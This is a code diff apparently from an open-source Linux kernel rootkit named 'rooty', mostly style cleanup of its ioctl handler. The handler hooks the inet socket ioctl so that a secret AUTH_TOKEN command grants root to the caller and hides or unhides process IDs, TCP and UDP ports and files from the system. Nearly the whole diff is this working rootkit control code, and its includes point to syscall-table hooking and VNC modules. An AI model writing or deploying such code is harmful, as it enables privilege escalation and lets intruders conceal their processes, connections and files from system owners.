@@ -1,17 +1,25 @@
-#ifndef IOCTL_H
-#define IOCTL_H
-
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <linux/net.h>
 #include <linux/limits.h>
-#include "common/rooty_uapi.h"
+#include <asm/uaccess.h>
 
-static int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
+#include "../include/ioctl_handler.h"
+#include "../include/syscall_table.h"
+#include "../include/proc_fs_hide.h"
+#include "../include/socket_hide.h"
+#include "../include/vnc.h"
+#include "../common/rooty_uapi.h"
 
-void *get_inet_ioctl ( int family, int type, int protocol )
+int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);
+
+void *get_inet_ioctl(int family, int type, int protocol)
 {
     void *ret;
     struct socket *sock = NULL;
 
-    if ( sock_create(family, type, protocol, &sock) )
+    if (sock_create(family, type, protocol, &sock))
         return NULL;
 
     ret = sock->ops->ioctl;
@@ -21,20 +29,17 @@ void *get_inet_ioctl ( int family, int type, int protocol )
     return ret;
 }
 
-static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
+long n_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
 {
     int ret;
     struct rooty_args args;
 
-    if ( cmd == AUTH_TOKEN )
-    {
+    if (cmd == AUTH_TOKEN) {
         ret = copy_from_user(&args, (void *)arg, sizeof(args));
-        if ( ret )
+        if (ret)
             return -EFAULT;
 
-        switch ( args.cmd )
-        {
-
+        switch (args.cmd) {
         case 0:
             root_me();
             break;
@@ -43,7 +48,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_proc_args proc_args;
             ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Hiding PID %d\n", proc_args.pid);
             hide_proc(proc_args.pid);
@@ -54,7 +59,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_proc_args proc_args;
             ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Unhiding PID %d\n", proc_args.pid);
             unhide_proc(proc_args.pid);
@@ -64,9 +69,8 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         case 3:
         {
             struct rooty_port_args port_args;
-
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Hiding TCPv4 port %hu\n", port_args.port);
             hide_tcp4_port(port_args.port);
@@ -77,7 +81,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Unhiding TCPv4 port %hu\n", port_args.port);
             unhide_tcp4_port(port_args.port);
@@ -87,9 +91,8 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         case 5:
         {
             struct rooty_port_args port_args;
-
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Hiding TCPv6 port %hu\n", port_args.port);
             hide_tcp6_port(port_args.port);
@@ -100,7 +103,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Unhiding TCPv6 port %hu\n", port_args.port);
             unhide_tcp6_port(port_args.port);
@@ -111,7 +114,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Hiding UDPv4 port %hu\n", port_args.port);
             hide_udp4_port(port_args.port);
@@ -122,7 +125,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Unhiding UDPv4 port %hu\n", port_args.port);
             unhide_udp4_port(port_args.port);
@@ -133,7 +136,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Hiding UDPv6 port %hu\n", port_args.port);
             hide_udp6_port(port_args.port);
@@ -144,7 +147,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             struct rooty_port_args port_args;
             ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
             printk("rooty: IOCTL->Unhiding UDPv6 port %hu\n", port_args.port);
             unhide_udp6_port(port_args.port);
@@ -156,16 +159,15 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
             char *name;
             struct rooty_file_args file_args;
             ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
-            if ( file_args.namelen > NAME_MAX )
+            if (file_args.namelen > NAME_MAX)
                 return -EINVAL;
             name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
-            if ( ! name )
-                return 0;
+            if (!name)
+                return -ENOMEM;
             ret = copy_from_user(name, file_args.name, file_args.namelen);
-            if ( ret )
-            {
+            if (ret) {
                 kfree(name);
                 return -EFAULT;
             }
@@ -180,16 +182,15 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
             char *name;
             struct rooty_file_args file_args;
             ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
-            if ( ret )
+            if (ret)
                 return -EFAULT;
-            if ( file_args.namelen > NAME_MAX )
+            if (file_args.namelen > NAME_MAX)
                 return -EINVAL;
             name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
-            if ( ! name )
-                return 0;
+            if (!name)
+                return -ENOMEM;
             ret = copy_from_user(name, file_args.name, file_args.namelen);
-            if ( ret )
-            {
+            if (ret) {
                 kfree(name);
                 return -EFAULT;
             }
@@ -201,7 +202,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         break;
 
         default:
-        	printk("rooty: IOCTL->Unknown command");
+            printk("rooty: IOCTL->Unknown command");
             break;
         }
         return 0;
@@ -213,5 +214,3 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
     return ret;
 }
-
-#endif /* IOCTL_H */
